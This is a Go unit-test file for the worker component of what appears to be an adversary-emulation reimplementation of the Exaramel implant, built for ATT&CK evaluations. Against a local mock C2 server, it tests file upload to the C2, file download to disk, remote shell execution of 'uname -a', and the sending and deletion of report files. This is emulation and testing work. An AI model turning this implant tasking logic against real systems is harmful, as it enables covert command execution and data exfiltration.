package worker_test

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"testing"

	"attackevals.mitre-engenuity.org/exaramel/configur"
	"attackevals.mitre-engenuity.org/exaramel/networker"
	"attackevals.mitre-engenuity.org/exaramel/worker"
)

var exampleAuth networker.AuthStruct

// Set up exampleAuth structure to contain default values to use for tests
func setTestAuthValues() error {
	platform, err := exec.Command("uname", "-a").Output()
	if err != nil {
		return err
	}
	curr_dir, err := os.Getwd()
	if err != nil {
		return err
	}
	exampleAuth = networker.AuthStruct{
		Guid:       "exaramel-implant",
		Whoami:     "myUserName",
		Platform:   string(platform),
		Version:    "0.1",
		Generation: "1",
		IP:         configur.GetOutboundIP(),
		PID:        "1111",
		PPID:       "2222",
		Dir:        curr_dir,
	}
	networker.SetAuthValues(exampleAuth.Guid, exampleAuth.Whoami, exampleAuth.Platform, exampleAuth.IP, exampleAuth.PID, exampleAuth.PPID, exampleAuth.Dir)
	return nil
}

// Error handler to send errors to client functions from server
func writeError(w http.ResponseWriter, e error) {
	var respErr networker.RespError
	respErr.Error.Code = 1
	respErr.Error.Message = e.Error()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(respErr)
}

// Testing IO.ReadFile
// Tests reading of file that exists. Expects successful read.
func TestIOReadFile(t *testing.T) {
	if err := setTestAuthValues(); err != nil {
		t.Error(err)
	}
	task := networker.TaskResponse{
		ID:                1,
		Method:            "IO.ReadFile",
		Arguments:         "../go.mod",
		Attachment:        0,
		AnswerWait:        0,
		DoAsync:           0,
		AnswerImmediately: 0,
		WaitOutputTime:    0,
	}
	var reportResp networker.Reports
	reportResp.Response.ID = exampleAuth.Guid
	reportResp.Response.CommandID = 1
	reportResp.Response.Status = 1

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		err := r.ParseMultipartForm(32 << 20)
		if err != nil {
			writeError(w, err)
			t.Error(err)
			return
		}
		guid := r.FormValue("guid")
		if guid != exampleAuth.Guid {
			err := fmt.Errorf("Guid didn't match! Received: %v", guid)
			writeError(w, err)
			t.Error(err)
			return
		}
		taskIdStr := r.FormValue("task_id")
		taskIdInt, err := strconv.Atoi(taskIdStr)
		if err != nil {
			writeError(w, err)
			t.Error(err)
			return
		}
		if taskIdInt != 1 {
			message := fmt.Sprintf("TaskID didn't match! Received %v", taskIdInt)
			writeError(w, errors.New(message))
			t.Error(message)
		}

		file, handler, err := r.FormFile("file")
		if err != nil {
			writeError(w, err)
			t.Error(err)
			return
		}
		defer file.Close()

		var outputContents bytes.Buffer
		io.Copy(&outputContents, file)

		filename := handler.Filename

		if filename != "go.mod" {
			err := fmt.Errorf("Filename didn't match: %v", filename)
			writeError(w, err)
			t.Error(err)
			return
		}

		fileContents, err := ioutil.ReadFile("../go.mod")
		if err != nil {
			writeError(w, err)
			t.Error(err)
		}

		if outputContents.String() != string(fileContents[:]) {
			err := fmt.Errorf("output contents didn't match\nReceived: %v\nActual: %v", outputContents, fileContents)
			writeError(w, err)
			t.Error(err)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(reportResp)
	}))
	defer server.Close()
	networker.SetC2Server(server.URL)

	if err := worker.DirectCommand(task); err != nil {
		t.Error(err)
	}
}

// Tests writing of file that exists on the server. Should be successful.
func TestIOWriteFile(t *testing.T) {
	if err := setTestAuthValues(); err != nil {
		t.Error(err)
	}
	task := networker.TaskResponse{
		ID:                1,
		Method:            "IO.WriteFile",
		Arguments:         "test.file",
		Attachment:        0,
		AnswerWait:        0,
		DoAsync:           0,
		AnswerImmediately: 0,
		WaitOutputTime:    0,
	}
	fileContents := "This is dummy file content"

	var reportResp networker.Reports
	reportResp.Response.ID = exampleAuth.Guid
	reportResp.Response.CommandID = 1
	reportResp.Response.Status = 1

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.Contains(r.URL.String(), "attachment.get") {
			urlParts := strings.SplitN(r.URL.String(), "/", 4)
			guid := urlParts[2]
			taskId := urlParts[3]
			if guid != exampleAuth.Guid {
				err := fmt.Errorf("GetTask guid in URL did not match actual guid (exaramel-implant): %v", guid)
				writeError(w, err)
				t.Error(err)
				return
			}
			if taskId != "1" {
				err := fmt.Errorf("GetTask taskId in URL did not match actual taskId (1): %v", taskId)
				writeError(w, err)
				t.Error(err)
				return
			}
			fmt.Fprint(w, fileContents)
		} else {
			err := r.ParseMultipartForm(32 << 20)
			if err != nil {
				writeError(w, err)
				t.Error(err)
				return
			}
			guid := r.FormValue("guid")
			if guid != exampleAuth.Guid {
				err := fmt.Errorf("Guid didn't match! Received: %v", guid)
				writeError(w, err)
				t.Error(err)
				return
			}
			taskIdStr := r.FormValue("task_id")
			taskIdInt, err := strconv.Atoi(taskIdStr)
			if err != nil {
				writeError(w, err)
				t.Error(err)
				return
			}
			if taskIdInt != 1 {
				message := fmt.Sprintf("TaskID didn't match! Received %v", taskIdInt)
				writeError(w, errors.New(message))
				t.Error(message)
				return
			}

			message := "File successfully written to disk"
			outputContents := r.FormValue("file")
			if outputContents != message {
				message := fmt.Sprintf("output contents didn't match: %v", outputContents)
				writeError(w, errors.New(message))
				t.Error(message)
				return
			}

			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(reportResp)
		}
	}))
	defer server.Close()
	networker.SetC2Server(server.URL)

	if err := worker.DirectCommand(task); err != nil {
		t.Error(err)
	}
	newFileContents, err := ioutil.ReadFile("test.file")
	if err != nil {
		t.Error(err)
	}
	if string(newFileContents[:]) != fileContents {
		t.Errorf("new file contents didn't match: %v", newFileContents)
	}
	if err := os.Remove("test.file"); err != nil {
		t.Error(err)
	}
}

// Tests execution of a shell command. Should be successful.
func TestOSShellExecute(t *testing.T) {
	if err := setTestAuthValues(); err != nil {
		t.Error(err)
	}
	task := networker.TaskResponse{
		ID:                1,
		Method:            "OS.ShellExecute",
		Arguments:         "uname -a",
		Attachment:        0,
		AnswerWait:        0,
		DoAsync:           0,
		AnswerImmediately: 0,
		WaitOutputTime:    0,
	}

	var reportResp networker.Reports
	reportResp.Response.ID = exampleAuth.Guid
	reportResp.Response.CommandID = 1
	reportResp.Response.Status = 1

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		err := r.ParseMultipartForm(32 << 20)
		if err != nil {
			writeError(w, err)
			t.Error(err)
			return
		}
		guid := r.FormValue("guid")
		if guid != exampleAuth.Guid {
			err := fmt.Errorf("Guid didn't match! Received: %v", guid)
			writeError(w, err)
			t.Error(err)
			return
		}
		taskIdStr := r.FormValue("task_id")
		taskIdInt, err := strconv.Atoi(taskIdStr)
		if err != nil {
			writeError(w, err)
			t.Error(err)
			return
		}
		if taskIdInt != 1 {
			message := fmt.Sprintf("TaskID didn't match! Received %v", taskIdInt)
			writeError(w, errors.New(message))
			t.Error(message)
			return
		}

		commandResult, err := exec.Command("uname", "-a").Output()
		if err != nil {
			writeError(w, err)
			t.Error(err)
			return
		}
		outputContents := r.FormValue("file")
		if outputContents != string(commandResult[:]) {
			message := fmt.Sprintf("output contents didn't match: %v", outputContents)
			writeError(w, errors.New(message))
			t.Error(message)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(reportResp)
	}))
	defer server.Close()
	networker.SetC2Server(server.URL)

	if err := worker.DirectCommand(task); err != nil {
		t.Error(err)
	}
}

// Tests processing of report files within Exaramel's directory. .rep files should be processed, .deb should not.
func TestProcessReportFiles(t *testing.T) {

	if err := setTestAuthValues(); err != nil {
		t.Error(err)
	}

	if err := ioutil.WriteFile("1.rep", []byte("This is report 1"), 0644); err != nil {
		t.Error(err)
	}
	if err := ioutil.WriteFile("2.rep", []byte("This is report 2"), 0644); err != nil {
		t.Error(err)
	}
	if err := ioutil.WriteFile("3.deb", []byte("This is report 3"), 0644); err != nil {
		t.Error(err)
	}

	var reportResp networker.Reports
	reportResp.Response.ID = exampleAuth.Guid
	reportResp.Response.CommandID = 1
	reportResp.Response.Status = 1

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {

		err := r.ParseMultipartForm(32 << 20)
		if err != nil {
			writeError(w, err)
			t.Error(err)
			return
		}
		guid := r.FormValue("guid")
		if guid != exampleAuth.Guid {
			err := fmt.Errorf("Guid didn't match! Received: %v", guid)
			writeError(w, err)
			t.Error(err)
			return
		}
		taskIdStr := r.FormValue("task_id")
		taskIdInt, err := strconv.Atoi(taskIdStr)
		if err != nil {
			writeError(w, err)
			t.Error(err)
			return
		}

		expectedContents := "This is report "
		switch taskIdInt {
		case 1:
			expectedContents += "1"
		case 2:
			expectedContents += "2"
		default:
			t.Error(errors.New("taskId didn't match: " + taskIdStr))
		}

		outputContents := r.FormValue("file")
		t.Log(fmt.Sprintf("Received report for taskId %v with contents %v", taskIdStr, outputContents))
		if outputContents != expectedContents {
			message := fmt.Sprintf("output contents didn't match: %v", outputContents)
			writeError(w, errors.New(message))
			t.Error(message)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(reportResp)

	}))
	defer server.Close()
	networker.SetC2Server(server.URL)

	err := worker.ProcessReportFiles()
	if err != nil {
		t.Error(err)
	}

	if file, err := os.Stat("1.rep"); err == nil {
		t.Error(file.Name() + " not deleted")
	}
	if file, err := os.Stat("2.rep"); err == nil {
		t.Error(file.Name() + " not deleted")
	}

	if _, err := os.Stat("3.deb"); os.IsNotExist(err) {
		t.Error("Processed 3.deb when I shouldn't have!")
	}
	os.Remove("3.deb")
}
